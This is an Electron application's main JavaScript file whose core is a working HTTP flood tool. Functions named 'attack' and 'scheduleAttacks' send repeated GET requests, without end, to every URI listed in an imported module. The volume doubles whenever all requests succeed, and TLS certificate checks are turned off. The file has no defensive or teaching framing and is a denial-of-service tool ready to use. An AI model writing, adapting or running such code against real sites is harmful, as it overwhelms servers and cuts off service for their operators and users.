const { app, BrowserWindow } = require("electron");
const parse = require("url-parse");
const path = require("path");
const uris = require("./uris");

const createWindow = () => {
  const win = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      preload: path.join(__dirname, "preload.js"),
    },
  });

  win.loadFile("index.html");
};

const attack = (uri) => {
  const parts = parse(uri);
  const server =
    parts.protocol == "https:" ? require("https") : require("http");

  return new Promise((resolve) => {
    server
      .get(
        {
          hostname: parts.hostname,
          port: parts.port,
          path: parts.path,
          agent: false,
        },
        function () {
          return resolve(true);
        }
      )
      .on("error", function (err) {
        return resolve(false);
      });
      setTimeout(() => resolve(false), 60000);
  });
};

const scheduleAttacks = (uri, count) => {
  console.log(`swarming ${uri} with ${count} requests`);
  return new Array(count).fill(0).map((_i) => {
    return attack(uri);
  });
};

const run = async (uri, count = 2) => {
  const schedules = scheduleAttacks(uri, count);
  const result = await Promise.all(schedules);
  const succeeded = result.filter((s) => s).length;
  if (succeeded === count) {
    count *= 2;
  } else if (succeeded >= 1) {
    count /= 2;
  } else {
    count = 1;
  }
  run(uri, count);
};

app.whenReady().then(() => {
  createWindow();

  process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

  uris.forEach(async (uri) => {
    console.log("uri", uri);
    run(uri);
  });
});

app.on("window-all-closed", () => {
  if (process.platform !== "darwin") app.quit();
});
